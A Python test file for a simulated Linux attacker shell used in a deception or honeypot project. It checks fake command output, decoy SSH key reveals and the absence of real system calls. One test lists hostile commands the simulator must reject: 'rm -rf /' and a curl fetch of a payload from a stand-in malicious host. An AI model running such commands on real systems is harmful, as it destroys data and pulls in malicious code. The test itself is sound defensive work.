"""
tests/test_simulator.py — Comprehensive Tests for the Linux Attacker Simulator (Phase 6).

Covers:
- Simulator health endpoint (/api/simulator/health) and state endpoint (/api/simulator/state).
- All supported simulation commands (help, whoami, hostname, pwd, ls, cat, ps, ip addr, exit).
- Handling of unsupported simulation commands with safe rejection messages.
- Execution of all allowed scenario actions (reconnaissance, authentication_abuse, file_discovery,
  download_attempt, privilege_escalation, benign_activity).
- Rejection of invalid action names (HTTP 400).
- Live integration with analysis.engine (Phase 2) and deception.engine (Phase 3).
- Verification of dynamic decoy reveal in simulated cat and ls output.
- Session propagation, new session creation, and world state reset.
- Determinism for identical commands and initial states.
- Safety boundaries: Zero subprocess or system calls, zero host filesystem modifications.
"""

from __future__ import annotations

import os
import unittest
from unittest.mock import patch

from fastapi.testclient import TestClient

from dashboard.app import app
from simulator.app import app as standalone_sim_app
from simulator.engine import (
    SUPPORTED_ACTIONS,
    SUPPORTED_COMMANDS,
    SimulatorEngine,
)


class TestSimulatorAPI(unittest.TestCase):
    """Test suite for the simulator REST API via TestClient."""

    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(app)
        cls.standalone_client = TestClient(standalone_sim_app)

    def setUp(self):
        # Reset simulator state before each test
        self.client.post("/api/simulator/reset")

    def test_health_endpoint(self):
        res = self.client.get("/api/simulator/health")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["status"], "ok")
        self.assertIn("active_session", data)
        self.assertEqual(data["supported_commands"], sorted(SUPPORTED_COMMANDS))
        self.assertEqual(data["supported_actions"], sorted(SUPPORTED_ACTIONS))

    def test_state_endpoint(self):
        res = self.client.get("/api/simulator/state")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("session_id", data)
        self.assertIn("world_state", data)
        self.assertIn("events", data)

    def test_supported_command_whoami(self):
        res = self.client.post("/api/simulator/command", json={"command": "whoami"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["supported"])
        self.assertEqual(data["terminal_output"], "root")
        self.assertIn("analysis", data)
        self.assertIn("deception", data)

    def test_supported_command_hostname(self):
        res = self.client.post("/api/simulator/command", json={"command": "hostname"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["supported"])
        self.assertEqual(data["terminal_output"], "corp-srv-db01")

    def test_supported_command_pwd(self):
        res = self.client.post("/api/simulator/command", json={"command": "pwd"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["terminal_output"], "/root")

    def test_supported_command_help(self):
        res = self.client.post("/api/simulator/command", json={"command": "help"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("Supported commands:", data["terminal_output"])

    def test_supported_command_ps(self):
        res = self.client.post("/api/simulator/command", json={"command": "ps aux"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("sshd", data["terminal_output"])
        self.assertIn("nginx", data["terminal_output"])

    def test_supported_command_ip_addr(self):
        res = self.client.post("/api/simulator/command", json={"command": "ip addr"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("192.0.2.10", data["terminal_output"])

    def test_supported_command_cat_passwd(self):
        res = self.client.post("/api/simulator/command", json={"command": "cat /etc/passwd"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("root:x:0:0", data["terminal_output"])

    def test_supported_command_exit(self):
        res = self.client.post("/api/simulator/command", json={"command": "exit"})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("Connection to 192.0.2.10 closed", data["terminal_output"])

    def test_unsupported_command_handled_safely(self):
        dangerous_cmds = [
            "rm -rf /",
            "curl http://malicious.site/payload.sh",
            "powershell Stop-Computer",
            "reboot",
        ]
        for cmd in dangerous_cmds:
            res = self.client.post("/api/simulator/command", json={"command": cmd})
            self.assertEqual(res.status_code, 200)
            data = res.json()
            self.assertFalse(data["supported"])
            self.assertIn("command not supported in simulation environment", data["terminal_output"])

    def test_empty_command_handled_safely(self):
        res = self.client.post("/api/simulator/command", json={"command": "   "})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["terminal_output"], "")

    def test_oversized_command_rejected_400(self):
        long_cmd = "whoami " + "x" * 600
        res = self.client.post("/api/simulator/command", json={"command": long_cmd})
        self.assertEqual(res.status_code, 400)
        self.assertIn("exceeds maximum length", res.json()["detail"])

    def test_all_scenario_actions_execute_successfully(self):
        actions = [
            "reconnaissance",
            "authentication_abuse",
            "file_discovery",
            "download_attempt",
            "privilege_escalation",
            "benign_activity",
        ]
        for act in actions:
            # Reset before each action to test clean evaluation
            self.client.post("/api/simulator/reset")
            res = self.client.post("/api/simulator/action", json={"action": act})
            self.assertEqual(res.status_code, 200, f"Action '{act}' failed!")
            data = res.json()
            self.assertTrue(len(data["terminal_output"]) > 0)
            self.assertIn("analysis", data)
            self.assertIn("deception", data)

    def test_invalid_action_rejected_400(self):
        res = self.client.post("/api/simulator/action", json={"action": "unauthorized_arbitrary_attack"})
        self.assertEqual(res.status_code, 400)
        self.assertIn("is not supported", res.json()["detail"])

    def test_deception_engine_responds_to_credential_command(self):
        """Typing 'cat /etc/shadow' should trigger PE-02 and present decoy SSH key."""
        res = self.client.post("/api/simulator/command", json={"command": "cat /etc/shadow"})
        self.assertEqual(res.status_code, 200)
        data = res.json()

        # Phase 2 Analysis findings
        analysis = data["analysis"]
        finding_rules = [f["rule_id"] for f in analysis["findings"]]
        self.assertIn("PE-02", finding_rules)

        # Phase 3 Deception response
        deception = data["deception"]
        self.assertEqual(deception["policy_id"], "POL-CRED-DECOY-SSH")
        self.assertEqual(deception["action"]["action_id"], "present_decoy_file")
        self.assertEqual(deception["action"]["target"], "/root/.ssh/id_rsa_backup")

        # Dynamic world state feedback: Decoy should now be visible when listed or read!
        ls_res = self.client.post("/api/simulator/command", json={"command": "ls /root/.ssh"})
        self.assertIn("id_rsa_backup", ls_res.json()["terminal_output"])

        cat_res = self.client.post("/api/simulator/command", json={"command": "cat /root/.ssh/id_rsa_backup"})
        self.assertIn("SYNTHETIC_DECOY_KEY_MATERIAL_UNUSABLE", cat_res.json()["terminal_output"])

    def test_new_session_initializes_fresh_id(self):
        initial_state = self.client.get("/api/simulator/state").json()
        initial_id = initial_state["session_id"]

        new_res = self.client.post("/api/simulator/session/new")
        self.assertEqual(new_res.status_code, 200)
        new_id = new_res.json()["session_id"]
        self.assertNotEqual(initial_id, new_id)

    def test_simulator_static_ui_served_under_dashboard(self):
        res = self.client.get("/simulator/")
        self.assertEqual(res.status_code, 200)
        self.assertIn("Linux Attacker Simulator", res.text)
        self.assertIn("SIMULATION ONLY", res.text)

    def test_standalone_simulator_serves_root(self):
        res = self.standalone_client.get("/")
        self.assertEqual(res.status_code, 200)
        self.assertIn("Linux Attacker Simulator", res.text)

    def test_no_system_calls_made_by_simulator(self):
        """Verify the simulator never invokes subprocess or system commands."""
        with patch("subprocess.Popen", side_effect=AssertionError("subprocess.Popen invoked!")):
            with patch("subprocess.run", side_effect=AssertionError("subprocess.run invoked!")):
                with patch("subprocess.call", side_effect=AssertionError("subprocess.call invoked!")):
                    with patch("os.system", side_effect=AssertionError("os.system invoked!")):
                        # Run command and action
                        self.client.post("/api/simulator/command", json={"command": "whoami"})
                        self.client.post("/api/simulator/action", json={"action": "reconnaissance"})

    def test_no_real_files_created_or_modified(self):
        """Verify simulated files do not exist or get created on real disk."""
        sim = SimulatorEngine()
        sim.execute_command("cat /root/.ssh/id_rsa_backup")
        # Ensure no real file is written to host
        self.assertFalse(os.path.exists("/root/.ssh/id_rsa_backup"))


if __name__ == "__main__":
    unittest.main()
